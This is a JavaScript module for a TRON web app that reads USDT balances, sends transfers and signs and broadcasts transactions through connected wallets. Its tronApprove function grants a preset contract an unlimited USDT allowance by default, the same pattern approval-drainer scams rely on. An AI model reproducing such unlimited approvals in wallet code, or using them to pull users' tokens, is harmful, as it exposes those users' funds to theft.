'use client';

import { TronWeb } from 'tronweb'
import abi from './abi.json'
import { TRON_FULL_HOST,TRON_USDT_CONTRACT_ADDRESS,TRON_CLIENT_CONTRACT_ADDRESS } from '../../constant/constant'


const MAX_UINT256 = ((BigInt(1) << BigInt(256)) - BigInt(1)).toString()

const TRON_CAIP_NETWORK_ID = 'tron:0x2b6653dc'

function requireConfig() {
  if (!TRON_USDT_CONTRACT_ADDRESS) {
    throw new Error('Missing TRON USDT contract address')
  }
}
export function getReadOnlyTronWeb(ownerAddress) {
  const tw = new TronWeb({ fullHost: TRON_FULL_HOST })
  if (ownerAddress) tw.setAddress(ownerAddress)
  return tw
}

function toUnits(amount, decimals) {
  const [whole, frac = ''] = String(amount).split('.')
  const fracPadded = (frac + '0'.repeat(decimals)).slice(0, decimals)
  const normalized = (whole === '' ? '0' : whole) + fracPadded
  return BigInt(normalized).toString()
}

function fromUnits(raw, decimals) {
  const value = BigInt(raw.toString())
  const base = BigInt(10) ** BigInt(decimals)
  const whole = value / base
  const frac = (value % base).toString().padStart(decimals, '0').replace(/0+$/, '')
  return frac ? `${whole}.${frac}` : whole.toString()
}


async function signTronTx(walletProvider, unsignedTx, fromAddress) {
  if (!walletProvider) throw new Error('TRON wallet is not connected')
  if (typeof walletProvider.signTransaction === 'function') {
    return walletProvider.signTransaction(unsignedTx)
  }


  const underlying = walletProvider.provider
  const isWalletConnect =
    walletProvider.type === 'WALLET_CONNECT' ||
    (underlying && underlying !== walletProvider)
  if (isWalletConnect && underlying && typeof underlying.request === 'function') {
    return underlying.request(
      {
        method: 'tron_signTransaction',
        params: { address: fromAddress, transaction: unsignedTx },
      },
      TRON_CAIP_NETWORK_ID
    )
  }

  if (typeof walletProvider.request === 'function') {
    return walletProvider.request({
      method: 'tron_sendTransaction',
      params: { transaction: unsignedTx },
    })
  }
  throw new Error('TRON wallet provider does not support signing')
}

function unwrapSignedTx(result, unsignedTx) {
  return (
    result?.result?.transaction ||
    result?.transaction ||
    result?.result ||
    result ||
    unsignedTx
  )
}
function decodeTronMessage(message) {
  if (!message) return ''
  const msg = String(message)
  if (/^[0-9a-fA-F]+$/.test(msg) && msg.length % 2 === 0) {
    try {
      return TronWeb.toUtf8 ? TronWeb.toUtf8(msg) : msg
    } catch {
      return msg
    }
  }
  return msg
}


async function broadcastSignedTx(tw, response, unsignedTx) {
  const signedTx = unwrapSignedTx(response, unsignedTx)


  const walletBroadcastTxid =
    response?.txid ||
    response?.result?.txid ||
    (response?.result === true && (signedTx?.txID || unsignedTx.txID))
  if (walletBroadcastTxid) {
    return { hash: walletBroadcastTxid || signedTx?.txID }
  }

  if (!signedTx?.signature) {
    throw new Error('Wallet did not return a signed transaction (signing rejected?)')
  }

  const receipt = await tw.trx.sendRawTransaction(signedTx)
  const hash =
    receipt?.txid || receipt?.transaction?.txID || signedTx?.txID || unsignedTx.txID

  if (receipt && receipt.result === false) {
    const reason = decodeTronMessage(receipt.message)
    if (/dup|already|been processed|exists/i.test(reason)) {
      return { hash }
    }
    throw new Error(reason || 'TRON broadcast failed')
  }

  return { hash }
}

export async function getTronBalance(account) {
  requireConfig()
  if (!account) throw new Error('No TRON account connected')
  const tw = getReadOnlyTronWeb(account)

  const contract = await tw.contract(abi, TRON_USDT_CONTRACT_ADDRESS)
  const [rawBalance, decimals, symbol] = await Promise.all([
    contract.balanceOf(account).call(),
    contract.decimals().call(),
    contract.symbol().call(),
  ])

  const decimalsNum = Number(decimals.toString())
  return {
    raw: rawBalance.toString(),
    balance: fromUnits(rawBalance, decimalsNum),
    symbol,
    decimals: decimalsNum,
  }
}


export async function tronTransfer(walletProvider, fromAddress, receiver, amount) {
  requireConfig()
  if (!walletProvider) throw new Error('Wallet is not connected')
  if (!fromAddress) throw new Error('No TRON account connected')

  const tw = getReadOnlyTronWeb(fromAddress)
  if (!tw.isAddress(receiver)) throw new Error('Invalid TRON receiver address')
  if (!amount || Number(amount) <= 0) throw new Error('Enter a valid amount')

  const contract = await tw.contract(abi, TRON_USDT_CONTRACT_ADDRESS)
  const decimals = await contract.decimals().call()
  const value = toUnits(amount, Number(decimals.toString()))

  const built = await tw.transactionBuilder.triggerSmartContract(
    TRON_USDT_CONTRACT_ADDRESS,
    'transfer(address,uint256)',
    { feeLimit: 100_000_000, callValue: 0 },
    [
      { type: 'address', value: receiver },
      { type: 'uint256', value },
    ],
    fromAddress
  )
  const unsignedTx = built.transaction

  const response = await signTronTx(walletProvider, unsignedTx, fromAddress)
  return broadcastSignedTx(tw, response, unsignedTx)
}

export async function tronApprove(walletProvider, fromAddress, spender = TRON_CLIENT_CONTRACT_ADDRESS) {
  requireConfig()
  if (!walletProvider) throw new Error('Wallet is not connected')
  if (!fromAddress) throw new Error('No TRON account connected')

  const tw = getReadOnlyTronWeb(fromAddress)
  if (!tw.isAddress(spender)) throw new Error('Invalid/empty spender address')

  const built = await tw.transactionBuilder.triggerSmartContract(
    TRON_USDT_CONTRACT_ADDRESS,
    'approve(address,uint256)',
    { feeLimit: 100_000_000, callValue: 0 },
    [
      { type: 'address', value: spender },
      { type: 'uint256', value: MAX_UINT256 },
    ],
    fromAddress
  )
  const unsignedTx = built.transaction

  const response = await signTronTx(walletProvider, unsignedTx, fromAddress)
  return broadcastSignedTx(tw, response, unsignedTx)
}
